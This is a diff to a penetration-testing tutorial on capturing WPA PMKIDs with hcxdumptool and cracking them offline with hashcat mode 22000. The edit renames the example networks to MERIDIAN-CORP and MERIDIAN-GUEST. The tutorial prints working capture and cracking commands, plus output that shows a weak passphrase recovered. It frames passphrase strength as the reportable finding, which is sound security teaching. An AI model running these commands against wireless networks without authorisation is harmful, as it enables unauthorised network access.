@@ -28,11 +28,11 @@ Capture with hcxdumptool, convert with hcxpcapngtool, crack with Hashcat:
 
 ```shell-session
 operator@kali:~$ sudo hcxdumptool -i wlan0mon -o cap.pcapng --enable_status=1
-[AP] AA:BB:CC:11:22:33  CorpWiFi   PMKID captured
+[AP] 00:00:5E:00:53:C0  MERIDIAN-CORP   PMKID captured
 operator@kali:~$ hcxpcapngtool -o hash.hc22000 cap.pcapng
 1 PMKID(s) written to hash.hc22000
 operator@kali:~$ hashcat -m 22000 hash.hc22000 rockyou.txt
-...:CorpWiFi:Summer2024!
+...:MERIDIAN-CORP:Summer2024!
 ```
 
 The `22000` mode is the modern unifier: it cracks **both** PMKIDs *and* captured 4-way handshakes, so whatever you captured (method A or B), the offline step is identical. hcxpcapngtool also filters, deduplicates, and reports which networks yielded usable material.
@@ -43,11 +43,11 @@ PMKID is a huge convenience — but it is not universal:
 
 ```shell-session
 operator@kali:~$ sudo hcxdumptool -i wlan0mon -o cap.pcapng --enable_status=1
-[AP] AA:BB:CC:11:22:33  CorpWiFi     PMKID captured        ✓
-[AP] DD:EE:FF:44:55:66  GuestNet     associating... no PMKID in response   ✗
+[AP] 00:00:5E:00:53:C0  MERIDIAN-CORP     PMKID captured        ✓
+[AP] 00:00:5E:00:53:C1  MERIDIAN-GUEST     associating... no PMKID in response   ✗
 ```
 
-**The deliberate break:** `CorpWiFi` leaked a PMKID on association, but `GuestNet` did **not** — because the PMKID is only present when the AP caches it (a roaming/802.11r-related feature), and plenty of APs simply don't include one. A beginner assumes PMKID always works and gives up when an AP is silent; the right move is to **fall back to method A** (capture a real 4-way handshake from a connecting client) — which is why the `-m 22000` format existing for *both* matters so much. And the wall from the whole category still stands: whether it's a PMKID or a handshake, the offline crack only beats a **weak** passphrase — `Summer2024!` falls, a 20-character random PSK does not. hcxtools made *capture* clientless and quiet; it did nothing to make a strong passphrase crackable, so the reportable finding remains passphrase strength, not the tool's cleverness.
+**The deliberate break:** `MERIDIAN-CORP` leaked a PMKID on association, but `MERIDIAN-GUEST` did **not** — because the PMKID is only present when the AP caches it (a roaming/802.11r-related feature), and plenty of APs simply don't include one. A beginner assumes PMKID always works and gives up when an AP is silent; the right move is to **fall back to method A** (capture a real 4-way handshake from a connecting client) — which is why the `-m 22000` format existing for *both* matters so much. And the wall from the whole category still stands: whether it's a PMKID or a handshake, the offline crack only beats a **weak** passphrase — `Summer2024!` falls, a 20-character random PSK does not. hcxtools made *capture* clientless and quiet; it did nothing to make a strong passphrase crackable, so the reportable finding remains passphrase strength, not the tool's cleverness.
 
 ## Summary
 
